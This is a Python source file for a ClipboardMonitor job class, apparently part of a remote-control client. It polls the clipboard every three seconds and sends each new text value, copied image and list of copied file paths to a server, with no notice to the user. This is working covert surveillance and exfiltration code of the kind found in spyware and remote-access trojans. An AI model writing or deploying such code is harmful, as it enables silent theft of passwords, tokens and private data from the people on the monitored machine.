import hashlib
import io
import threading
import time

from client.jobs.job import Job
from common.util import get_size, logger


class ClipboardMonitor(Job):
    def __init__(self):
        super().__init__()
        self.recent_text = None
        self.image_hash = None
        self.file_list = None
        self.transfer_images = False
        self.interval = 3

    def run(self):
        try:
            time.sleep(2)
            import pyperclip
            self.send_to_server(1, 'Module imported: pyperclip', 0)

            self.is_running = True
            self.send_to_server(1, 'Clipboard monitoring started', 1)

            if self.transfer_images:
                from PIL import ImageGrab, Image
                self.send_to_server(1, 'Module imported: pillow', 0)
                while self.is_running:
                    im = ImageGrab.grabclipboard()
                    if im is None:
                        clipboard_text = pyperclip.paste()
                        self._handle_text_change(clipboard_text)
                    elif isinstance(im, Image.Image):
                        self._handle_image_change(im)
                    else:
                        if isinstance(im, list):
                            self._handle_file_change(im)
                        else:
                            print(f'Unsupported type: {im}')
                    time.sleep(self.interval)

            else:
                while self.is_running:
                    clipboard_text = pyperclip.paste()
                    self._handle_text_change(clipboard_text)
                    time.sleep(self.interval)

            self.send_to_server(1, 'Clipboard monitoring stopped', 0)
        except Exception as e:
            self.send_to_server(0, f'Error occurs: {e}', 0)
        finally:
            logger.info(f'Thread ended: {threading.current_thread().name}')
            self.send_to_server(1, f'Thread ended: {threading.current_thread().name}', 1)

    def _handle_text_change(self, text: str):
        """处理文本剪贴板变化"""
        if text and text != self.recent_text:
            self.recent_text = text
            self.send_to_server(1, f'Clipboard text changed: {text}', 0)

    def _handle_image_change(self, im):
        image_hash = hashlib.sha256(im.tobytes()).hexdigest()
        if image_hash != self.image_hash:
            self.image_hash = image_hash
            b = io.BytesIO()
            im.save(b, 'BMP')
            self.send_to_server(1,
                                f'Image copy detected, image being sent, length is {get_size(b.getbuffer().nbytes)}',
                                0)
            self.send_io_to_server(b)
            self.send_to_server(1, 'Image has been successfully sent', 0)

    def _handle_file_change(self, im):
        file_list = ', '.join(im)
        if file_list != self.file_list:
            self.file_list = file_list
            self.send_to_server(1, f'Files copy detected: {self.file_list}', 0)
